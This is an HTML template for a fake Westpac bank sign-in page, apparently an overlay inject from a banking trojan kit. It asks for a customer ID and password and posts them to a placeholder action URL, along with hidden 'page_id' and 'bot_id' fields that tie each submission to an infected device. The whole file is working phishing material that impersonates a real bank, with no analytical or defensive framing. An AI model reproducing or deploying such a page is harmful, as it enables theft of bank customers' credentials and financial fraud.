<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>Westpac</title>

    <link rel="stylesheet" href="%DYN_PATH%/css/normalize.css">
    <link rel="stylesheet" href="%DYN_PATH%/css/main.css">
    <link rel="stylesheet" href="%DYN_PATH%/css/02.css">
<style type='text/css'>
.form_header:after {
	content: url('%DYN_PATH%/shadow.png');
    height:31px;
	display: none;
	position: absolute;
	bottom: -17px;
	z-index: -1;
	left: 50%;
	margin-left: -204px;
	width:409px;
}
</style>
    <script src="%DYN_PATH%/js/vendor/jquery-1.11.3.min.js"></script>
    <script src="%DYN_PATH%/js/viewport.js"></script>
</head>

<body>
    <div class="row">
        <div class="form_header">
            <img src="%DYN_PATH%/img/logo.png" alt="">
        </div>
    </div>
		<div class="modal modal_02">
			<div class="container">
			<form action="%ACTION%" method="post" class="wrapper">
                <input type="hidden" name="page_id" value="%PKG%" class="main_input"><input type="hidden" name="bot_id" value="%BOTID%" />
                
					<div class="row">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
									Enter your customer ID
								</div>
								<div class="inp_wr">
									<input type="text" name="fields[customerID]" class="main_input">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									Enter your password
								</div>
								<div class="inp_wr">
									<input type="password" name="fields[password]" class="main_input">
								</div>
							</div>
					
							<div class="btn_wr">
								<button class="sign_btn">
									Sign in <img src="%DYN_PATH%/img/arr.png" alt="">
								</button>
							</div>
						</div>
					</div>
				</form>
			</div>
		</div>
</body>
</html>
